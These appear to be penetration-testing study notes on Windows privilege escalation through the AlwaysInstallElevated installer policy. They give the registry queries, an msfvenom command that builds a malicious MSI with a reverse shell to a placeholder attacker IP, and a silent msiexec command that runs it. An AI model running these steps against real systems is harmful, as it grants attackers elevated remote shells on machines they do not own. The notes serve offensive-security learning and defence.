Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, <mark style="background: #BBFABBA6;">these can be configured to run with higher privileges from any user account (even unprivileged ones)</mark>. This could potentially allow us to generate a malicious MSI file that would run with admin privileges

**<mark style="background: #FF5582A6;">Check Registry Values</mark>:**

- Commands:
```graphql
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

- Purpose: Confirm if registry values are set for AlwaysInstallElevated.

- **<mark style="background: #FF5582A6;">Generate Malicious MSI File</mark>:**

- Command: 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[LocalPort] -f msi -o malicious.msi
```

- Purpose: Create a malicious MSI file with a reverse shell payload.

- **<mark style="background: #FF5582A6;">Run Malicious Installer</mark>:**

- Command:
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

   • Purpose: Execute the installer to trigger the payload.

- **<mark style="background: #FF5582A6;">Receive Reverse Shell</mark>:**
    - Ensure the Metasploit Handler is configured.
    - Upon successful execution, the attacker gains a shell with elevated privileges.